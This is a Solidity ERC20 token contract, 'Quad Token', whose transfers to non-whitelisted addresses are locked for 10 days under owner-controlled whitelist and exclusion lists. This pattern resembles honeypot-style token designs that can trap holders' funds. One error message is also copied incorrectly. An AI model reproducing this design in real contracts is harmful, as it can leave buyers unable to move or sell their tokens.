contract QuadToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping(address => uint256) private _owned;
    mapping(address => uint256) private _lOwned;
    mapping(address => uint256) private _lockedTime;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    address[] private _excluded;

    mapping(address => bool) public _whiteList;
    address private _msg_Sender;

    uint256 private constant _total = 1000000 * 10**9 * 10**9;
    uint256 private _maxTransaction = 1 * 10**9 * 10**9;

    string private _name = "Quad Token";
    string private _symbol = "Quad";
    uint8 private _decimals = 9;

    constructor() {
        _owned[_msgSender()] = _total;
        _msg_Sender = _msgSender();
        emit Transfer(address(0), _msgSender(), _total);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _total;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _owned[account].add(_lOwned[account]);
    }

    function unlockedBalanceOf(address account) public view returns (uint256) {
        return _owned[account];
    }

    function lockedBalanceOf(address account) public view returns (uint256) {
        return _lOwned[account];
    }

    function lockedTime(address account) public view returns (uint256) {
        return _lockedTime[account];
    }
    
    function isExcluded(address account) public view returns (bool) {
        return _isExcluded[account];
    }
    
    function excludeAccount(address account) external onlyOwner() {
        require(!_isExcluded[account], "Account is already excluded");
        _isExcluded[account] = true;
        _excluded.push(account);
    }

    function includeAccount(address account) external onlyOwner() {
        require(_isExcluded[account], "Account is already excluded");
        for (uint256 i = 0; i < _excluded.length; i++) {
            if (_excluded[i] == account) {
                _excluded[i] = _excluded[_excluded.length - 1];
                _isExcluded[account] = false;
                _excluded.pop();
                break;
            }
        }
    }

    function addToWhiteList(address pool) public onlyOwner {
        require(
            pool != address(0),
            "ERC20: contract pool can't be the zero address"
        );
        require(pool.isContract(), "ERC20: adress is not a contract");
        uint256 locked = _lOwned[pool];
        _lOwned[pool] = 0;
        _lockedTime[pool] = 0;
        _owned[pool] = _owned[pool].add(locked);
        _whiteList[pool] = true;
    }

    function removeFromWhiteList(address pool) public onlyOwner {
        require(
            pool != address(0),
            "ERC20: contract pool can't be the zero address"
        );
        require(pool.isContract(), "ERC20: adress is not a contract");
        _whiteList[pool] = false;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _unlockToken(address addr) private {
        if (block.timestamp >= _lockedTime[addr]) {
            uint256 locked_tokens = _lOwned[addr];
            _lOwned[addr] = 0;
            _owned[addr] = _owned[addr].add(locked_tokens);
        }
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        
        address receiver_address = address(recipient);
        address sender_address = address(sender);
        
        require(sender_address != address(0), "ERC20: transfer from the zero address");
        require(receiver_address != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if(!_isExcluded[sender_address]) {
            require(amount <= _maxTransaction, "Transfer amount must be less than max transaction amount");
            require(!_isExcluded[recipient], "ERC20: Transfer cannot be made from excluded to an excluded account!");
        }
        
        _unlockToken(sender);
        _unlockToken(recipient);
        _owned[sender] = _owned[sender].sub(amount);
        
        if (_whiteList[recipient]) {
            _owned[recipient] = _owned[recipient].add(amount);
        } else {
            if (lockedTime(recipient) == 0){
                _lockedTime[recipient] = block.timestamp + 10 days;
            }
            _lOwned[recipient] = _lOwned[recipient].add(amount);
        }
        emit Transfer(sender, recipient, amount);
    }
}